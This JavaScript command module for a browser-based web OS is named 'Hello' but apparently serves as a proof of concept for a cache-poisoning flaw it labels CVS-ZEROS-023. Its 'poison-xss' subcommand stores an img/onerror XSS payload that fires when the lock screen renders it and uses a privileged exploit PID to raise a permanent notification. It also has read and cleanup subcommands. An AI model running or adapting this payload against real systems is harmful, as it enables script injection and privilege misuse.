(function(window) {
    'use strict';
    // 项目
    const HELLO = {
        // 信息
        __info__: function() {
            return {
                name: 'Hello',           // 显示名，可以和命令名不同
                type: 'CLI',             // bin 必须是 CLI
                version: '1.0.0',
                description: '我的第一个命令',
                author: '小小萱',
                copyright: '© 2026',
                permissions: typeof PermissionManager !== 'undefined' ? [
                    PermissionManager.PERMISSION.EVENT_LISTENER,
                    PermissionManager.PERMISSION.CACHE_READ,
                    PermissionManager.PERMISSION.CACHE_WRITE
                ] : [],
                metadata: {
                    autoStart: false,              // 不要开机自启
                    priority: 1,
                    allowMultipleInstances: true   // 允许多开
                }
            };
        },

        // 核心处理函数
        __coreHandler__: async function(arg,terminal) {
            switch(arg){
                case '--help':
                case '-h':
                    terminal.write('用法: hello [选项|子命令] [参数...]\n');
                    terminal.write('  poison       投毒纯文本 dailyQuote (023)\n');
                    terminal.write('  poison-xss   投毒 XSS payload，锁屏后弹持久通知\n');
                    terminal.write('  read         以 EXPLOIT_PID 读取 dailyQuote\n');
                    terminal.write('  cleanup      删除 exploit 命名空间下的 dailyQuote\n');
                    terminal.write('  -h           本帮助\n');
                    break;
                case '--test':
                case '-t':
                    terminal.write('Hello World\n');
                    break;
                case 'read':
                    const exp = ProcessManager.EXPLOIT_PID;  // 10000
                    const got = await ProcessManager.callKernelAPI(
                        exp, 'Cache.get', ['system.dailyQuote', null, {}]
                    );
                    this.terminal.write('read: ' + got + '\n');
                    break;
                case 'cleanup':
                    await this._kernelAPI.call('Cache.delete', [
                        'system.dailyQuote',
                        { programName: 'exploit' }
                    ]);
                    terminal.write('cleanup: deleted programs.exploit.system.dailyQuote\n');
                    break;
                case 'poison-xss':
                    // 锁屏 innerHTML 渲染后执行；借 EXPLOIT_PID 调 Notification.create，duration:0 不自动关闭
                    var xssPayload = '<img src=x onerror="ProcessManager.callKernelAPI(ProcessManager.EXPLOIT_PID,\'Notification.create\',[({title:\'CVS-ZEROS-023 XSS\',message:\'缓存投毒触发 — 此通知不会自动关闭\',type:\'snapshot\',duration:0})]).catch(function(e){console.error(e)})">';
                    await this._kernelAPI.call('Cache.set', [
                        'system.dailyQuote',
                        xssPayload,
                        { programName: 'exploit', ttl: 0 }
                    ]);
                    terminal.write('poison-xss: payload written. Ctrl+L 锁屏触发; 完成后 hello cleanup\n');
                    break;
                case 'poison':
                    const marker = '[cachelab-' + Date.now() + ']';
                    await this._kernelAPI.call('Cache.set', [
                        'system.dailyQuote',
                        marker,
                        { programName: 'exploit', ttl: 0 }
                    ]);
                    break;
                default:
                    terminal.write('Hello,' + arg + '\n');
                    break;
            }
        },

        // 初始化
        __init__: async function(pid, initArgs = {}) {
            this.pid = pid;
            this.terminal = initArgs.terminal;
            this._kernelAPI = initArgs.kernelAPI || null;
            this._closing = false;
            this.args = initArgs.args || [];
            
            if (!this.terminal) {
                throw new Error('Hello 需要终端环境');
            }
        
            const args = initArgs.args || [];   // 命令行参数数组
        
            setTimeout(async () => {
                // 主逻辑
                try {
                    // 无参有参特别处理
                    if(args.length === 0){
                        // 无参特殊处理
                        await this.terminal.write('Hello World\n');
                    }else{
                        // 有参正常走
                        for (const item of args) {
                            await this.__coreHandler__(item, this.terminal);
                        }
                    }
                } catch (error) {
                    this.terminal.write('出现了一些问题:\n');
                    this.terminal.write(error.message);
                }
                await this._selfClose();
            }, 0);
        },

        // 自关闭
        _selfClose: async function() {
            if (this._closing) return;
            this._closing = true;
        
            await new Promise(resolve => setTimeout(resolve, 500));
        
            if (!this.pid) return;
        
            try {
                if (this._kernelAPI && typeof this._kernelAPI.call === 'function') {
                    await this._kernelAPI.call('Process.requestSelfTermination', []);
                } else if (typeof ProcessManager !== 'undefined') {
                    await ProcessManager.callKernelAPI(
                        this.pid, 'Process.requestSelfTermination', []
                    );
                }
            } catch (e) {
                // 可选：ProcessManager.killProgram(this.pid, true)
            }
        },

        // 退出
        __exit__: async function() {
            this.terminal = null;
            this._kernelAPI = null;
        }
    };

    // 注册挂载
    if (typeof window !== 'undefined') {
        window.HELLO = HELLO;   // 对象名和 const HELLO 一致
    }
})(window);